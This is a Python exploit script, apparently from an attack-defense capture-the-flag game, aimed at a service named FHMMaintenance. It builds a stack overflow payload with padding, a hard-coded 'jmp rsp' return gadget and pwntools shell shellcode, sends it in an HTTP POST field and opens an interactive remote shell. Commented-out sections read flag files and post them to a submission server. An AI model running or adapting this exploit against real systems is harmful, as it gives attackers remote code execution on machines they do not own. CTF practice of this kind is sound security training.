#!/usr/bin/env python

import socket
from lxml import html
import requests
import sys
import os
import random
import string
import time
from struct import pack
from pwn import remote, asm, context, shellcraft
from hashlib import sha1
from base64 import urlsafe_b64encode as b64enc

_USER_ = ''.join(random.choice(string.ascii_letters) for i in range(32))
_PASS_ = ''.join(random.choice(string.ascii_letters) for i in range(32))

HOST = "127.0.0.1"
PORT = 5000

def usage():
    print "Usage: %s <ip>" % os.path.basename(__file__)

def submitFlags(f):
    c=f.splitlines()
    #defflag=""
    #txtFile = open("Output1.txt", "w")
    for i in c:
	if ("FLG_" in i):
       		 flag_pos = (i.find("FLG_")+4)
       		 #print(flag_pos)
       		 flag = i[flag_pos:flag_pos+20]
		 #defflag=flag
       		 #flag1 = flag.split(":")[0]
		 print "Sending flag"
       		 #print(flag1)
       		 #txtFile.write(flag)
       		 #txtFile.write("\n")
   		 res=requests.post("http://" + HOST + ":" + str(PORT) + "/submit", data={'flag': flag, 'team':'LiquidPad', 'service': 'FHMMaintenance'})
		 print res.text
    #txtFile.close()
    return
def readfile(path, dst='rdi'):
    """this function comes from pwntools itself"""
    craft = shellcraft.amd64

    ret = craft.mov('r8', dst)
    ret += craft.pushstr(path)
    ret += craft.syscall('SYS_open', 'rsp', 'O_RDONLY')
    ret += craft.mov('rbx', 'rax')
    ret += craft.syscall('SYS_fstat', 'rax', 'rsp')
    ret += 'add rsp, 48\n'
    ret += 'mov rdx, [rsp]\n'
    ret += craft.syscall('SYS_sendfile', 'r8', 'rbx', 0, 'rdx')
    return ret

def get_payload():
    # Create the payload
    context.arch = 'amd64'
    craft = shellcraft.amd64

    rop = pack('<Q', 0x00000000004027d9)   # jmp rsp ; ret
    shellcode = craft.linux.sh()
    '''
    if shell:

    else:
        shellcode = 'sub rsp, 255\n' # To handle struct stat
        shellcode += readfile(
                "doc_root/htpass/%s" % b64enc(sha1(flag_id).digest()),
                1
                )                       # send the file to stdout
        shellcode += craft.linux.syscall('SYS_exit', 0)
    '''

    rop += asm(shellcode)

    for c in ['&', '\r', '\n']:
        if c in rop:
            print "Found %x in the shellcode" % ord(c)
            sys.exit(2)

    payload = "POST /test HTTP/1.0\r\n\r\nusername=%s&secret=%s&pass=%s\r\n"% \
            (_USER_, "A"*0xb8 + rop, _PASS_)
    return payload


def exploit(ip, port):
    payload = get_payload()

    # Send the payload
    sock=remote(ip, port)
    sock.send(payload)
    sock.interactive()
    '''
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((ip, port))

    sock.settimeout(0.3)
    sock.sendall(payload)
    time.sleep(0.1)

    time.sleep(0.3)
    sock.interactive()

    # Exploit the result: shell

    buf = ''
    while buf != 'exit':
        #buf = raw_input("$ ")
        #sock.sendall("%s\n" % buf)
        buf = buf + "cat /opt/ctf/FHM-Maintenance/rw/doc_root/htpass/*"
        sock.sendall("%s\n" % buf)
	sock.setblocking(False)
	time.sleep(0.1)

    	try:
		f=sock.recv(8192)
	    	print "Flag sending"
		submitFlags(f)
		buf=""
		time.sleep(10)

        except:
		pass


    if shell:

    else:
        try:
            f = sock.recv(4096)
            print f.splitlines()[-1]
        except socket.timeout:
            pass
    '''


if __name__ == '__main__':
    # parse options
    if len(sys.argv) < 2:
        usage()
        sys.exit(1)



    ip = sys.argv[1]
    #port = int(sys.argv[3])
    port = 20111
    exploit(ip, port)

    '''if cmd == 'shell':

    elif cmd == 'retrieve':
        exploit(ip, port, flag_id, False)'''
